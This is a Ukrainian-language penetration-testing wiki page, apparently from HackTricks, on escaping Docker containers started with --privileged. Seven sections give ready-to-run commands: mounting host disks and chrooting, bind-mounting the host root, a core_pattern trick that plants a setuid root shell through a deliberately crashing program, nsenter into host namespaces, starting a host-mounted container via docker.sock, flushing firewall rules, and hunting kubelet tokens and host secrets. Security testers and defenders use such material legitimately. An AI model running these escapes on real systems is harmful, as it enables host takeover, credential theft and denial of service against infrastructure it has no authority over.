# Втеча з контейнерів із `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Контейнер, запущений з `--privileged`, — це не те саме, що звичайний контейнер з однією-двома додатковими привілеями. На практиці `--privileged` знімає або послаблює кілька стандартних runtime-захистів, які зазвичай віддаляють робоче навантаження від небезпечних ресурсів хоста. Точний ефект залежить від runtime та хоста, але для Docker звичайний результат такий:

- надаються всі capabilities
- обмеження device cgroup знімаються
- багато kernel файлових систем перестають монтуватися як read-only
- стандартні masked procfs шляхи зникають
- seccomp фільтрація відключається
- ізоляція AppArmor відключається
- ізоляція SELinux відключається або замінюється значно ширшою міткою

Важливим наслідком є те, що привілейованому контейнеру зазвичай не потрібен витончений експлойт ядра. У багатьох випадках він може просто взаємодіяти з пристроями хоста, kernel файловими системами, що звернені до хоста, або runtime-інтерфейсами безпосередньо, а потім переключитися на shell хоста.

## Чого `--privileged` автоматично не змінює

`--privileged` **не** приєднує автоматично namespace-и хоста PID, network, IPC або UTS. Привілейований контейнер усе ще може мати приватні namespace-и. Це означає, що деякі ланцюжки втечі вимагають додаткової умови, наприклад:

- bind mount хоста
- спільний PID з хостом
- host networking
- видимі пристрої хоста
- записувані proc/sys інтерфейси

Ці умови часто легко виконати при реальних неправильних налаштуваннях, але концептуально вони відокремлені від `--privileged` самого по собі.

## Шляхи втечі

### 1. Примонтування диска хоста через видимі пристрої

Привілейований контейнер зазвичай бачить набагато більше вузлів пристроїв під `/dev`. Якщо блочний пристрій хоста видимий, найпростіший шлях втечі — примонтувати його й виконати `chroot` у файлову систему хоста:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Якщо root partition неочевидний, спочатку перелічте block layout:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Якщо практичним шляхом є розміщення setuid helper у записуваному монтуванні хоста замість `chroot`, пам’ятайте, що не кожна файлова система шанує біт setuid. Швидка перевірка можливостей на хості:
```bash
mount | grep -v "nosuid"
```
Це корисно, оскільки записувані шляхи під файловими системами з `nosuid` значно менш цікаві для класичних сценаріїв «скинути setuid shell і виконати її пізніше».

Ослаблені механізми захисту, якими зловживають тут:

- повний доступ до пристроїв
- широкі capabilities, особливо `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Монтування або повторне використання bind mount хоста і `chroot`

Якщо коренева файлова система хоста вже змонтована всередині контейнера, або якщо контейнер може створити необхідні mount-и, оскільки він privileged, то хостова оболонка часто знаходиться лише на відстані одного `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо не існує кореневого bind-монту хоста, але сховище хоста доступне, створіть його:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Цей шлях зловживає:

- ослабленими обмеженнями монтування
- повні capabilities
- відсутністю MAC confinement

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Зловживання доступними для запису `/proc/sys` або `/sys`

Одним із великих наслідків `--privileged` є те, що захисти procfs і sysfs стають значно слабкішими. Це може відкрити інтерфейси ядра, орієнтовані на хост, які зазвичай маскуються або монтуються лише для читання.

Класичний приклад — `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Інші шляхи з високою цінністю включають:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Цей шлях зловживає:

- відсутні masked paths
- відсутні read-only system paths

Пов'язані сторінки:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Використайте повні можливості для Mount- Or Namespace-Based Escape

Привілейований контейнер отримує capabilities, які зазвичай видаляються зі стандартних контейнерів, включно з `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` та багатьма іншими. Це часто достатньо, щоб перетворити локальний foothold у host escape, щойно з'явиться інша exposed surface.

Простий приклад — монтування додаткових файлових систем та використання namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Якщо host PID також спільно використовується, крок стає ще коротшим:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Цей шлях зловживає:

- стандартним привілейованим набором можливостей
- опційним спільним доступом до PID хоста

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Привілейований контейнер часто має видимим стан runtime хоста або його сокети. Якщо доступний сокет Docker, containerd або CRI-O, найпростіший підхід зазвичай — використати runtime API для запуску другого контейнера з доступом до хоста:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Для containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Цей шлях зловживає:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Усунення побічних ефектів мережевої ізоляції

`--privileged` сам по собі не приєднує контейнер до неймспейсу мережі хоста, але якщо контейнер також має `--network=host` або інший доступ до мережі хоста, повний мережевий стек стає змінним:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це не завжди забезпечує безпосередній shell хоста, але може призвести до denial of service, перехоплення трафіку або доступу до служб керування, доступних лише через loopback.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Читання секретів хоста та стану виконання

Навіть якщо чистого виходу в shell хоста одразу немає, привілейовані контейнери часто мають достатній доступ, щоб читати секрети хоста, стан kubelet, метадані середовища виконання та файлові системи сусідніх контейнерів:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Якщо `/var` є host-mounted або runtime directories видимі, це може бути достатньо для lateral movement або cloud/Kubernetes credential theft навіть до отримання host shell.

Пов'язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Перевірки

Метою наступних команд є підтвердження, які privileged-container escape families є відразу застосовними.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Що тут цікаво:

- повний набір capabilities, особливо `CAP_SYS_ADMIN`
- можливість запису в proc/sys
- видимі пристрої хоста
- відсутні seccomp та MAC confinement
- runtime sockets або host root bind mounts

Будь-який із цих факторів може бути достатнім для post-exploitation. Кілька з них разом зазвичай означають, що контейнер фактично знаходиться на відстані однієї-двох команд від host compromise.

## Пов'язані сторінки

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
